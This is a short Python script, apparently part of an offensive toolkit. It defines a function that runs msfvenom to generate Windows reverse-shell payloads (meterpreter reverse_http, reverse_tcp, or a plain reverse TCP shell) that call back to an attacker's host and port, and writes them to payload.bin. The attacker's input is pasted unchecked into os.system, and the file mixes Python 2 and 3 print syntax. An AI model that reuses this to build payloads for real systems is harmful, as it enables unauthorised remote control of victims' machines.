#!/usr/bin/python
import os
import subprocess

def prepare_payload(payload, lhost, lport):


	path = os.getcwd()
	dest = path + "/payload.bin"
	if payload == 1:
		payload = "windows/meterpreter/reverse_http"
		os.system("msfvenom -p " + payload + " LHOST=" + lhost + " LPORT=" + lport + " -f raw -o " + dest)
	elif payload == 2:
		payload = "windows/meterpreter/reverse_tcp"
		os.system("msfvenom -p " + payload + " LHOST=" + lhost + " LPORT=" + lport + " -f raw -o " + dest)
	elif payload == 3:
		payload = "windows/shell_reverse_tcp"
		os.system("msfvenom -p " + payload + " LHOST=" + lhost + " LPORT=" + lport + " -f raw -o " + dest)
	else:
		print("ERROR IN CHOICE OF PAYLOAD")
	
	print "[+]Payload generated"